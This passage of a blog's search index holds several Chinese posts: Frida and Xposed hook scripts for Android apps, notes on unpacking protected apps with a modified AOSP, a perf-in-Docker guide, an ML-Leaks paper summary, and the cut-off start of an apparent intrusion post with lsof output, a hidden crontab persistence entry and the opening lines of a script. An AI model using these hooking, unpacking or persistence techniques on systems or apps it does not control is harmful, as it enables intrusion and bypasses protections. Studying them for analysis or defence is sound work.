x.getName() // short name // console.warn(x, v, k, type) if (immediates.some(type =\u0026gt; s.includes(type))) { obj[x] = v.toString() } else { // inner class obj[x] = dfs(v, depth+1) } }) return obj } function hookJava() { var cls = Java.classFactory.use(\u0026quot;com.package.classname\u0026quot;); cls.methodName.implementation = function (a1, a2, a3, a4) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookJava begin\u0026quot;) let a2str = JSON.stringify(map2obj(a2), null, 4) console.log(a1, a3, a4) console.warn(a2str) var res = this.methodName(a1, a2, a3, a4) console.warn('res:', res) return res console.log(\u0026quot;hookJava end\u0026quot;, '\u0026lt;'.repeat(10)) } } function printStack() { console.log(Java.use(\u0026quot;android.util.Log\u0026quot;).getStackTraceString(Java.use(\u0026quot;java.lang.Exception\u0026quot;).$new())) } function hookJavaFunc(clsName, funcName, argtypes, rettype, stack, func) { const cls = Java.classFactory.use(clsName) let funcObj = cls[funcName]; if (argtypes !== undefined) funcObj = funcObj.overload(...argtypes); const defaultFunc = function () { console.log('\u0026gt;'.repeat(10), funcName, \u0026quot;begin\u0026quot;) const argc = Array.from(arguments).length if (argtypes == null) argtypes = Array(argc) for (let i = 0; i \u0026lt; argc; i++) { console.log(printable(arguments[i], argtypes[i])); } const res = funcObj.apply(this, Array.from(arguments)) console.warn('res:', printable(res, rettype)) console.log(funcName, \u0026quot;end\u0026quot;, '\u0026lt;'.repeat(10)) if (stack) printStack() return res } funcObj.implementation = func || defaultFunc; } function hookMap(keywords) { const cls = Java.classFactory.use(\u0026quot;java.util.HashMap\u0026quot;) cls.get.implementation = function (key) { const res = this.get(key) const kStr = key ? key.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap get\u0026quot;, key, \u0026quot; =\u0026gt; \u0026quot;, res) printStack() } return res } cls.put.implementation = function (key, value) { const res = this.put(key, value) const kStr = key ? key.toString() : '' // const vStr = value ? value.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap put\u0026quot;, key, value) printStack() } return res } } function hookProxy() { var cls = Java.classFactory.use(\u0026quot;okhttp3.OkHttpClient$Builder\u0026quot;); cls.proxy.implementation = function (a1) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookProxy begin\u0026quot;) console.warn(a1) return this } } function hookNative() { let m = Process.findModuleByName('lib.so') let f = Module.findExportByName('lib.so', 'Functions_xx') console.log(m.base, f) // f = m.base.add(0xBDB8C) Interceptor.attach(f, { onEnter: function (args) { console.warn(\u0026quot;args:\u0026quot;, args[1], args[1].readCString()) }, onLeave: function (ret) { console.warn(\u0026quot;ret:\u0026quot;, ret, ret.readCString()) // this.context.r0 = 1 } }) } function findModules(name) { const mods = Process.enumerateModules() const found = name ? mods.filter(m.path.includes(name)) : mods; found.forEach(m =\u0026gt; console.log(JSON.stringify(m))) console.log(found.length, \u0026quot;modules found\u0026quot;) return found } function main() { if (Java.available) { Java.perform(() =\u0026gt; { console.log(\u0026quot;Performing Java hook...\u0026quot;) hookJava(); hookJavaFunc(\u0026quot;okhttp3.Request$Builder\u0026quot;, \u0026quot;post\u0026quot;, [\u0026quot;okhttp3.RequestBody\u0026quot;], undefined, true); }) } // hookNative(); // findModules(\u0026quot;libart\u0026quot;); } setImmediate(main)  Xposed https://wooyun.js.org/drops/Android.Hook框架xposed篇(Http流量监控).html\nXposed真的可以为所欲为——终 · 庖丁解码\nhttps://www.cnblogs.com/baiqiantao/p/10699552.html\nhttps://www.huruwo.top/使用xposed-hook-native详解/\nhttps://blog.bluarry.top/2020/02/28/2020-02-28-xposed模块编写之常用hook函数API/\n流程如下： 先建安卓项目，Empty Activity 或 No Activity 均可\n在 AndroidManifest.xml 的 \u0026lt;application\u0026gt; 标签下添加\n\u0026lt;meta-data android:name=\u0026quot;xposedmodule\u0026quot; android:value=\u0026quot;true\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposeddescription\u0026quot; android:value=\u0026quot;Learn Xposed\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposedminversion\u0026quot; android:value=\u0026quot;89\u0026quot; /\u0026gt;  在 app 的 build.gradle 中添加 dependency\ncompileOnly 'de.robv.android.xposed:api:82' compileOnly 'de.robv.android.xposed:api:82:sources'  任意新建类 implements IXposedHookLoadPackage，创建文件 assets/xposed_init（Android Studio 右键 app 新建 Folder -\u0026gt; Assets Folder 即可，实际位置在 src/app/main 下），向其中写入完整类名，即可生效。\npublic void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (!lpparam.packageName.equals(lpparam.processName)) return; // 保证每个应用只在其主进程来一次 if (!lpparam.packageName.equals(\u0026quot;com.example.appname\u0026quot;)) return; }  hook原理\n","date":"2021-11-17T16:38:08+08:00","permalink":"https://chinggg.github.io/post/android-hook/","tags":["Android","逆向"],"title":"Android Hook"},{"categories":["安全"],"contents":"安卓脱壳 FART 速成 环境准备 Pixel 3a XL 一台，代号 bonito，先恢复出厂系统 ，再准备相应源码， android-9.0.0_r47 对应 版本号 PQ3B.190801.002 对应，android-10.0.0_r2 对应 版本号 QP1A.190711.020\n首先上手编译安卓源码，从中科大源拉取 AOSP\nrepo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r2 repo sync source build/envsetup.sh lunch # 选择 bonito-userdebug m # 注意装齐依赖，老版本需要 py2  拉取时：\n  为刷入真机，开始编译前必须下载并解压对应机型版本的驱动！！\n  关于 repo 工具的分析，总之要区分 Repo 自身, manifest, project 三种不同层次的 repository\n  切换不同版本时 repo forall git checkout 会带来不同 project 在 branch 上的差异，应该再次 init 并 sync\n  编译时：\n Arch Linux 下编译可参考：https://blog.firerain.me/article/13 尽量不要用 root 用户编译，可能会有报错 flex locale 报错，改 LC_ALL=C 亦无效，进 prebuilts/misc 手动编译 flex apache-xml 报错，手动编译该部分 make clean-apache-xml make apache-xml 新增文件时，需将包名加至白名单 build/make/core/tasks/check_boot_jars/package_whitelist.txt  刷入时：\n Win 下 fastboot not detect device，安装 Google USB Driver 即可 Win 下 fastboot freeze/hang when flashing，尝试其他命令如 getvar all 远程 build 也可在本地 flash，拷贝输出目录下的*.img 至本地，ANDROID_PRODUCT_OUT=\u0026quot;./\u0026quot; fastboot flashall 即可 如果编译成功但刷入后发现无法开机，日志中有报错如  编译指南\n若有其他报错且全网难搜，先仔细看报错信息，定位相关代码是否位置与原版有出入，或是否可修改。\n只修改几处，也可能编译近几千个文件，花费数十分钟，务要小心谨慎。\n如何对 repo 进行版本管理：在对应 project 下仅添加改动的文件至暂存区，不新增 commit，也不使用 repo start 创建全局新分支，只用 repo diff 手动管理版本\n原理浅析 App 加固\n应用启动会从 ActivityThread 进入，在方法 performLaunchActivity 的最后执行 fartthread()\nYoupk 源码解读 自定义的代码几乎都封装在了 Unpacker 这个类里，额外添加 cJSON 和 unpacker 的 .h 和 .cc 共四个文件，可读性好，可惜基于 android-7.1.2_r33，会有一些大区别\nArt 部分改动的文件：\n dex2oat.cc  添加 shouldUnpack() 在 FINAL::ParseArgs() 中检查 shouldUnpack() 并 SetCompilerFilter  Android 9 的 CompilerFilter 中不再有 kVerifyAtRuntime     Android.mk(Nougat) -\u0026gt; Android.bp(Pie)  添加新文件至列表   artmethod.cc  在 Invoke() 中检查 Unpacker::isFakeInvoke() 如果是主动调用 FakeInvoke 并且是 native 方法则不执行   class_linker.h  让 Unpacker 成为 ClassLinker 的友元   runtime.cc  Runtime::RegisterRuntimeNativeMethods()   interpreter_switch_impl.cc  PREAMBLE_SAVE 中执行 beforeInstructionExecute ExecuteSwitchImplCpp 中执行 afterInstructionExecute   interpreter.cc  kInterpreterImplKind 从 kMterpImplKind 改为 kSwitchImplKind    从 Android 7 到 Android 9 导致 unpacker.cc 的改动\n 字段名与命名空间  StringPrintf 在 android::base:: 下 art:🪞:Class 下的 Status 被移到 art::ClassStatus 以 enum class PointerSize 代替 size_t，区分 32/64 位   DexFile 大变  文件移至新目录 art/libdexfile 下 DexFile 派生成 standard 和 compact CodeItem 原本 public 属性变 private，无法 offset 安卓 9 提供了 DexFile::GetCodeItemSize   ObjPtr  ClassLinker 类许多方法均返回了 ObjPtr，需调整 soa.Decode() 返回 ObjPtr，需 .Ptr()    技术进展 修改安卓源码：Art 模式下的通用脱壳方法\n脱壳原理及如何实现脱壳机\nFART 脱壳流程分析\ndex修复\n源码解析及编译支持 Pixel2\nFART相关原理及知识点\nDex起步探索\nFART 与 Youpk 结合\nFartExt之优化更深主动调用的FART10\n问题复盘   脱壳闪退\nE .bj.xhhosp.hsy: fartext ArtMethod::dumpArtMethod enter void com.hundsun.healthrecord.databinding.HsIncludeMedicalRecordEditBinding.\u0026lt;init\u0026gt;(android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, com.hundsun.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, com.hundsun.ui.edittext.CustomEditText, android.widget.TextView, com.hundsun.ui.edittext.CustomEditText, android.widget.TextView, com.hundsun.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.w  ❯ grep \u0026quot;databinding.HsIncludeMedicalRecordEditBinding\u0026quot; -Rl . ./43897952_dexfile_execute.dex ./2836792_dexfile_execute.dex ./2836792_classlist_execute.txt ./43897952_dexfile.dex ./2836792_dexfile.dex ./2836792_classlist.txt ./2836792_ins_4044.bin    ","date":"2021-11-05T23:04:43+08:00","permalink":"https://chinggg.github.io/post/fart/","tags":["Android","逆向"],"title":"FART"},{"categories":["记录"],"contents":"perf 简介 性能调优基本原理 在了解具体的工具之前，我们首先应该问自己，性能分析要追踪和优化什么。我们都知道程序的运行会占用包括 CPU，内存，文件描述符，锁，磁盘，网络等等在内的各种操作系统资源。根据 Amdahl 定律，当其中的某一个或多个资源出现瓶颈的时候，我们需要找到程序中最耗费资源的地方，并对其优化。\n那么我们可能需要做如下这些事情:\n 对系统资源持续进行观测以及时发现哪些资源出现了瓶颈 统计各个程序(进程)，确定哪个或哪些进程占用了过多的资源 分析问题进程，找出其占用过量资源的原因  很多工具都可以用来要想获取这些信息，但它们本质上都是从操作系统提供的观测源查询数据，Linux 中的观测源被称为 event ，是不同内核工具框架的统一接口，大致有如下几种:\n Hardware Events: 基于 CPU 性能监视计数器 PMC Software Events: 基于内核计数器的低级事件。例如，CPU 迁移、主次缺页异常等等 Kernel Tracepoint Events: 硬编码在内核中的静态内核级的检测点，即静态探针 User Statically-Defined Tracing (USDT): 这些是用户级程序和应用程序的静态跟踪点 Dynamic Tracing: 可以被放置在任何地方的动态探针。对于内核和用户级软件，分别使用 kprobes 和 uprobes 框架 Timed Profiling: 以指定频率收集的快照。这通常用于CPU使用情况分析，其工作原理是周期性的产生时钟中断事件  而 perf 就是一个 Linux 系统中的性能分析工具，它可以利用 Hardware Events, Software Events, Tracepoint, Dynamic Tracing 来对应用程序进行性能分析，从开发者的角度来讲，它可以分析如下各种问题：\n 为什么内核消耗 CPU 高, 代码的位置在哪里？ 什么代码引起了 CPU 2级缓存未命中？ CPU 是否消耗在内存 I/O 上？ 哪些代码分配内存，分配了多少？ 什么触发了 TCP 重传？ 某个内核函数是否正在被调用，调用频率有多少？ 线程释放 CPU 的原因？  安装和使用 由于和内核的紧密关系，perf 的安装需要与内核版本相匹配，一般来讲使用发行版自带的包管理器安装即可，注意不同发行版下的包名称：\n Alpine: perf，v3.12 以上才可安装 Debian: linux-perf，注意 Debian 10 的软件源中默认只有 4.19 版本，若需 5.10 版本，可使用 buster-backports 源 Ubuntu: linux-tools-*，星号为内核版本号或 generic  如果确实无法用包管理器安装或版本不匹配，可以下载对应版本内核源码并解压，在 tools/perf 目录下自行编译。\n安装好 perf 后，可以用 perf --help 或 man perf 查看相应的帮助信息，下面仅介绍使用 perf 对应用进程进行分析的基本流程。\n首先使用 perf record -p \u0026lt;pid\u0026gt; -g 来跟踪指定进程，此时 perf 会在前台进行性能监测，并在当前目录生成 perf.data 文件，当需要终止监测时，按 C-c 等待 perf 退出。\n数据生成完毕后，可使用 perf report 在命令行下查看，如果想要可视化分析，可以结合 FlameGraph 这款工具生成 SVG 火焰图，命令如下：\ngit clone --depth=1 https://github.com/BrendanGregg/FlameGraph sudo perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; flamegraph.svg  PS: perf timechart 本身也提供了导出 SVG 图片的功能，但需要 perf timechart record 来记录，而且输出的是进程运行过程中系统调度的情况，无法对程序的具体代码段进行性能分析。\nDocker 中运行 perf 实际场景中应用可能运行在 Docker 容器中，这时我们可以指定 PID 命名空间另开一个容器，使目标容器中的进程对其可见，然后在新开的容器中使用 perf 对应用进程进行分析，命令如下： docker run -it --pid=container:\u0026lt;目标容器ID\u0026gt; --network=container:\u0026lt;目标容器ID\u0026gt; \u0026lt;perf容器名\u0026gt;\n但由于 Docker 出于安全考虑对系统调用 perf_event_open 进行了限制，在执行 perf 的过程中可能出现如下 Permission Error：\nperf_event_open(..., PERF_FLAG_FD_CLOEXEC) failed with unexpected error 1 (Operation not permitted) perf_event_open(..., 0) failed unexpectedly with error 1 (Operation not permitted) You may not have permission to collect stats. Consider tweaking /proc/sys/kernel/perf_event_paranoid: -1 - Not paranoid at all 0 - Disallow raw tracepoint access for unpriv 1 - Disallow cpu events for unpriv 2 - Disallow kernel profiling for unpriv  一般可以通过三种方式解决：\n 查看宿主机 /proc/sys/kernel/perf_event_paranoid 的值，设为 -1，这样非特权用户也能调用 perf_event_open 了 在 docker run 时加上参数 --cap-add CAP_SYS_ADMIN 及 --privileged，赋予容器特权 下载一份 seccomp 默认配置文件 ，在其中给 perf_event_open 放行，保存为 custom.json，在 docker run 时加上参数 --security-opt seccomp=custom.json  在容器本身来源可靠的情况下，第二种方式应该是较为安全且方便的，下面就给出 Dockerfile 样例：\nFROM alpine:latest RUN sed -i.bak 's/dl-cdn.alpinelinux.org/mirrors.cloud.tencent.com/g' /etc/apk/repositories RUN apk add --update bash vim git perf perl thttpd RUN git clone --depth=1 https://github.com/BrendanGregg/FlameGraph RUN echo 'perf record -g -p $1' \u0026gt; record.sh \u0026amp;\u0026amp; \\ echo 'perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; $1' \u0026gt; plot.sh \u0026amp;\u0026amp; \\ chmod +x *.sh ENTRYPOINT [\u0026quot;bash\u0026quot;]  为方便使用编写了一键运行脚本：\n#!/bin/bash set -x target_container_id=\u0026quot;$1\u0026quot; version=\u0026quot;$(uname -r)\u0026quot; version=\u0026quot;${version%%-*}\u0026quot; version=\u0026quot;${version%.*}\u0026quot; tag=\u0026quot;v${2-$version}\u0026quot; if [[ $tag != \u0026quot;v5.4\u0026quot; \u0026amp;\u0026amp; $tag != \u0026quot;v5.10\u0026quot; ]]; then tag=\u0026quot;latest\u0026quot; fi image=${3-\u0026quot;perf\u0026quot;} docker run \\ --cap-add CAP_SYS_ADMIN \\ --privileged \\ -ti \\ --rm \\ --pid=container:$target_container_id \\ --network=container:$target_container_id \\ $image:$tag  复制以上代码保存为 attach.sh，执行 attach.sh \u0026lt;目标容器ID\u0026gt; 就进入了 perf 容器，此时可以使用 ps 查看目标容器中的进程，记下 pid 后执行 record.sh \u0026lt;pid\u0026gt; 开始记录，记录完成后运行 plot.sh \u0026lt;图片名.svg\u0026gt; 生成火焰图。\n导出图片一般可使用 docker cp 和 docker exec 或挂载 volume，为方便预览和复制文件，容器内置了轻量网页服务，执行 thttpd -p \u0026lt;端口号\u0026gt; 即可。由于脚本中没有设置端口转发，需要 docker inspect \u0026lt;目标容器ID\u0026gt; | grep IPAdress 查看目标容器的 IP，然后在浏览器中访问即可。若需要更灵活的操作，可不用以上脚本手动添加参数运行容器。\n扩展阅读 perf 及 Linux 性能调优：\n Linux perf examples，FlameGraph 作者 Brendan Gregg 本人撰写，非常全面 Linux 性能调优系列中文博客，其中有两篇博文分别介绍 perf 的原理和使用 perf 原理和實務 性能分析利器之perf浅析 Why \u0026lsquo;perf\u0026rsquo; needs to match the exact running Linux kernel version?  Docker 中使用 perf:\n Tutorial: Profiling Rust applications in Docker with perf 详细可操作的教程，调试目标为 Rust 程序 running perf in docker \u0026amp; kubernetes  分析 .NET 应用：\n Debug high CPU usage in .NET Core Profiling .NET Core app on Linux  ","date":"2021-09-09T15:46:57Z","permalink":"https://chinggg.github.io/post/docker-perf/","tags":["调试技巧","Docker"],"title":"在 Docker 中运行 Linux 性能分析工具 perf"},{"categories":["论文","安全"],"contents":"NDSS 2019 研究成果概括 ML-Leaks 前言 本文将对 NDSS (Network and Distributed System Security Symposium) 2019 获奖论文 ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models 进行解读。这篇论文的主要研究内容是针对机器学习模型的成员推理攻击（membership inference attack）以及对应的防御机制，其价值在于证明了经过改进后的成员推理攻击具有较低的成本和较强的可行性，从而构成更现实的威胁。\n论文地址：https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_03A-1_Salem_paper.pdf\n源码地址：https://github.com/AhmedSalem2/ML-Leaks\n论文作者：Ahmed Salem, Yang Zhang, Mathias Humbert, Pascal Berrang, Mario Fritz, Michael Backes\n正文 研究背景 机器学习已经成为许多现实应用的核心，互联网巨头如 Google 和 Amazon 已经在推广机器学习即服务（MLaaS）的模式，用户可以上传自己的数据集，服务器返回给用户一个训练好的机器学习模型，通常是一个黑盒 API。尽管机器学习模型已得到广泛应用，但它在安全和隐私上却易受攻击，如模型逆向（model inversion）、对抗样本（adversarial examples）和模型提取（model extraction）。\n本文关注的是成员推理攻击（membership inference attack），攻击者的意图是得知某个数据是否被用于训练机器学习模型，这种攻击可能引发严重的后果，比如一个机器学习模型在来自特定疾病患者的数据上训练，攻击者通过得知受害者的数据属于模型的训练集就能立刻推知其健康状况。\n早在2017年，Shokri 等人第一次展示了针对机器学习模型的成员推理攻击，大致思路是使用多个攻击模型（attack models）来对目标模型（target model）的输出，即后验概率（posterior probabilities），进行成员推理。考虑到目标模型是一个黑盒 API，Shokri 等人构造了多个影子模型以模拟目标模型的行为并导出训练攻击模型所需的数据，即后验和真实（ground truth）的成员情况。\nShokri 等人的工作基于两个主要假设。首先，攻击者需要建立多个影子模型模型，每个模型与目标模型具有相同的结构，这可以通过使用与训练目标模型相同的 MLaaS 实现。第二，用于训练影子模型的数据集来自与目标模型的训练数据相同的分布，这一假设适用于对大部分攻击的评估。Shokir 等人也进一步提出了合成数据来放宽这一假设，但由于效率原因这种方法只能适用于包含二值特征的数据集。\n这两个较强的假设减少了对机器学习模型进行成员推理攻击的攻击面，本文将逐步放宽这些假设，以表明更广泛适用的攻击场景是可能的，同时也提出了两种防御机制。\n准备工作 本文主要关注分类问题，机器学习中的分类器就是一个函数，其将一个数据点（多维特征向量）映射成一个输出向量$\\mathcal{M(X)=Y}$，$\\mathcal{Y}$ 的长度等于类别的个数，大多数情况下 $\\mathcal{Y}$ 可被解释成在所有类别上后验概率的集合， $\\mathcal{Y}$ 中所有值的和为1。\n而成员推理攻击的攻击模型可表示成如下函数 $\\mathcal{A}:X_{Target},\\mathcal{M,K}\\rightarrow{0,1}$，其中 $X_{Target}$ 为目标数据点，$\\mathcal{M}$ 为训练后的模型（称为目标模型），$\\mathcal{K}$ 为攻击者的外部知识，结果为0表示目标数据点不是目标模型训练集 $\\mathcal{D}_{Train}$ 的成员，为1则反之。\n本文利用8个不同的数据集进行实验，其中6个与 Shokri 等人使用的数据相同，即MNIST、CIFAR-10、CIFAR-100、Location、Purchase、Adult。按照相同的程序对所有这些数据集进行预处理。此外，本文还利用了另外两个数据集，即 News 和 Face，来进行评估。\n三轮攻击 从表格中可看出，每一轮攻击都减少了一两个假设，攻击者对目标模型和数据的了解可以越来越少，不禁让人联想起电影《倚天屠龙记》中张三丰教张无忌太极拳，招式忘得愈多，反而学得愈深，颇有老子“绝圣弃智”，“不出于户，以观天下”的味道。\n攻击一：不知模型 本轮攻击主要放宽了影子模型设计上的假设，只需使用1个影子模型而且无需知晓目标模型的结构，就可实施高效且廉价的成员推理攻击。不过，训练影子模型时仍需假设影子数据集 $\\mathcal{D}_{Shadow}$ 和目标模型的训练数据来自相同的分布。\n单一影子模型 这里进一步假设影子模型运用算法和超参数和目标模型相同，在实践中做到这点，攻击者可以使用和目标模型相同的 MLaaS 平台，后面将展示这个假设也可被放宽。\n攻击策略有以下三个阶段：\n 影子模型训练：攻击者首先将的影子数据集 $\\mathcal{D}_{Shadow}$ 分成两份，用训练集训练影子模型。 攻击模型训练：攻击者用训练过的影子模型对所有影子数据进行预测，获得后验概率向量，每个数据点取最大的三个值（若为二元分类则取两个）。一个特征向量被标记为1或0分别代表对应的数据点在或不在测试集中，产生的特征向量和标记接着就被用于训练攻击模型。 成员推理：为了推知目标是否在实际训练集中，攻击者向模型查询该数据点并得到后验概率，同样取最大的三个值，然后传给攻击模型来获得成员预测结果。  相比 Shokri 的方法需要使用多个影子模型对每个类别分别进行攻击，本方法只需使用一个影子模型进行攻击，这大大减少了攻击的开销。\n结果如 Fig. 1 所示，本攻击方法的精确率和召回率与 Shokri 等人的几乎一致，在部分数据集上甚至表现更优。\n目标模型结构 接下来展示如何放宽攻击者必须知道目标模型的算法与超参数的情况这一假设。\n首先来看超参数，暂且假设攻击者知道目标模型是一个神经网络但不了解具体细节，先用目标模型的一半参数（即将批尺寸、隐含单元和正则化参数减半）来训练影子模型时，就 Purchase-100 数据集而言，达到了0.86的精确率和0.83的召回率，这和 Fig. 1 中的结果几乎一致；反之，若用两倍参数来训练影子模型时，表现稍显逊色，但仍达到了0.82的精确率和0.80的召回率。在其他数据集上也得到了类似的结果，这证明了成员推理攻击的灵活性：无需知道模型的超参数也能有良好的性能。\n接着再假设攻击者不知道目标模型使用了何种分类算法，首先尝试在影子模型和目标模型的类别不同的情况下直接实施攻击，结果不尽人意。改进的方法是采用组合攻击（combined attack），即将一系列不同的分类器模型组合成一个影子模型，其中每个模型被称为次影子模型（sub-shadow model），具体方法如 Fig. 6 所示\n在 Purchase-100 数据集上的结果证明，和上一部分所展示的攻击方法相比，在目标模型采用多层感知器和逻辑回归时，组合攻击的表现毫不逊色，而当目标模型采用随机森林时，组合攻击的性能就有所下降。\n攻击二：不知数据 本轮攻击放宽了对数据来源的假设，攻击者不再拥有与目标模型的训练数据同分布的数据集，在此情形下，Shokri 等人提议多次查询目标模型以合成数据来训练影子模型，但这种方法只适用于包含二值特征的数据集，而且每合成一个数据点就需要向目标模型发起156次查询，这不仅代价高昂，还可能触发 MLaaS 的警戒机制。与之相比，本方法就能用于攻击在任何数据上训练的机器学习模型，且没有上述任何限制。\n本攻击的策略接近于第一轮攻击，区别在于影子模型所使用的数据集不再与目标模型的训练数据同分布，此种攻击可被称为数据转移攻击（data transferring attack）。在此影子模型并非用于模仿目标模型的行为，而只用于概括机器模型训练集中数据点的成员状态。由于只有最大的三个（对二值数据集来说是两个）后验概率会被用于攻击模型，我们可以忽略数据集的类别数不同带来的影响。\n结果如 Fig. 7 所示，和对角线上第一轮攻击的结果相比，本轮攻击在许多场景下都有接近的表现，如使用 Face 数据集攻击 CIFAR-100 数据集，无论是精确率还是召回率，结果都是0.95，和第一轮攻击相同。在一些场景下，本轮攻击的结果甚至优于第一轮攻击。更有意思的是，在很多场景下，不同来源的数据集能够有效地相互攻击，如 News 数据集 和 CIFAR-100 数据集。\n攻击三：我好像在哪见过你 本轮攻击不再需要训练任何影子模型，也无需知晓目标模型及其数据分布，攻击者拥有的只是向目标模型查询目标数据点 $X_{Target}$ 得到的后验概率 $\\mathcal{M}(X_{Target})$ 。尽管 Yeom 等人提出过类似的攻击，但他们的方法需要知晓目标数据点的分类标签，这有时是难以获得的，而本方法的适用场景就更广泛。\n本攻击模型的实现是一个无监督二元分类器，攻击者先获得 $\\mathcal{M}(X_{Target})$ ，再拿最高的后验概率和一个确定的阀值相比，若高于阀值，则预测此数据点在目标模型的训练集中。选取最高值作为特征是基于如下推理：模型对训练过的数据点表现得更自信，体现在结果上就是，成员数据点的后验概率最大值高于非成员数据点。这是一种朴素的信念，但也符合我们的直觉，人对熟悉的事物表现得更自信，模型亦是如此。\n阀值的选取可根据需求而定，若更关注精确率则用高阀值，更关注召回率则选择低阀值。本文也提供了选择阀值的通用方法。\n综合三轮攻击的结果，可以证明成员推理攻击是非常广泛地适用的。\n防御机制 丢弃 完全连通的神经网络包含大量的参数，容易发生过拟合，而丢弃（dropout）是减少过拟合的一种非常有效的方法。在一个完全连通的神经网络模型中，通过在每次训练迭代中随机删除一个固定的边缘比例（丢失率）来执行该算法。本文对目标模型的输入层和隐藏层都应用了丢弃法，默认的丢弃率设为0.5，因为实验结果表明过高或过低的丢弃率都会降低模型性能\n模型堆叠 丢弃只适用于神经网络模型，而模型堆叠（model stacking）与所选择的分类器无关，这种机制的背后的原理在于，若目标模型的不同部分使用不同的数据子集进行训练，则完整的模型就不易过拟合，这可以通过集成学习（ensemble learning）实现。\n成果总结 为了证明成员推理攻击的广泛性，本文提出了三轮攻击，逐渐放宽了假设。\n第一轮攻击只用到了一个影子模型，大大降低了攻击成本，还通过组合攻击使得攻击者无需了解目标模型的种类。\n第二轮攻击只用放宽了对数据来源的要求，数据转移攻击在实现成员推理攻击效果的同时也更具有普适性。\n第三轮攻击具有最少的假设，攻击者无需构建任何影子模型，攻击是通过无监督的方式进行，在这样的场景下，成员推理仍然卓有成效。\n本文对攻击效果的综合评估充分证明了各种机器学习模型中数据成员的隐私所面临的威胁，为了遏制攻击，本文提出了两种防御机制：丢弃和模型堆叠。由于模型的过拟合程度和对成员推理的敏感性之间存在联系，这些机制也正是为减少过拟合而生。大量评估证明这些防御机制在抵抗成员推理攻击的同时也维持了模型的高可用性。\n参考文献 [1] Salem, Ahmed et al. “ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models.” Proceedings 2019 Network and Distributed System Security Symposium (2019).\n[2] Shokri, R. et al. “Membership Inference Attacks Against Machine Learning Models.” 2017 IEEE Symposium on Security and Privacy (SP) (2017).\n[3] Pyrgelis, Apostolos et al. “Knock Knock, Who\u0026rsquo;s There? Membership Inference on Aggregate Location Data.” ArXiv abs/1708.06145 (2018).\n[4] Jia, J. and N. Gong. “AttriGuard: A Practical Defense Against Attribute Inference Attacks via Adversarial Machine Learning.” USENIX Security Symposium (2018).\n[5] Yeom, Samuel et al. “Privacy Risk in Machine Learning: Analyzing the Connection to Overfitting.” 2018 IEEE 31st Computer Security Foundations Symposium (CSF) (2018): 268-282.\n","date":"2021-05-22T13:46:52Z","permalink":"https://chinggg.github.io/post/ml-leaks/","tags":["论文"],"title":"ML-Leaks"},{"categories":["记录"],"contents":"└─# lsof -c uBXOvYBM COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME uBXOvYBM 318196 root cwd DIR 254,1 4096 2 / uBXOvYBM 318196 root rtd DIR 254,1 4096 2 / uBXOvYBM 318196 root txt REG 254,1 819252 1048698 /root/08db56cb75fd057be28be1007c5f4424 (deleted) uBXOvYBM 318196 root DEL REG 0,14 127380184 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030308 /anon_hugepage uBXOvYBM 318196 root DEL REG 0,14 17030306 /anon_hugepage uBXOvYBM 318196 root mem REG 254,1 582 925625 /usr/share/zoneinfo/PRC uBXOvYBM 318196 root 0u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 1u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 2r CHR 1,3 0t0 4 /dev/null uBXOvYBM 318196 root 3u a_inode 0,13 0 8043 [eventpoll] uBXOvYBM 318196 root 4r FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 5w FIFO 0,12 0t0 17030300 pipe uBXOvYBM 318196 root 6r FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 7w FIFO 0,12 0t0 17030299 pipe uBXOvYBM 318196 root 8u a_inode 0,13 0 8043 [eventfd] uBXOvYBM 318196 root 9w REG 254,1 7 262168 /tmp/.X11-unix/11 uBXOvYBM 318196 root 10u IPv4 129901501 0t0 TCP iZwgo7e0o4xyirZ:41142-\u0026gt;static.99.90.243.136.clients.your-server.de:http-alt (ESTABLISHED)  └─# crontab -l 33 * * * * /root/.systemd-service.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo 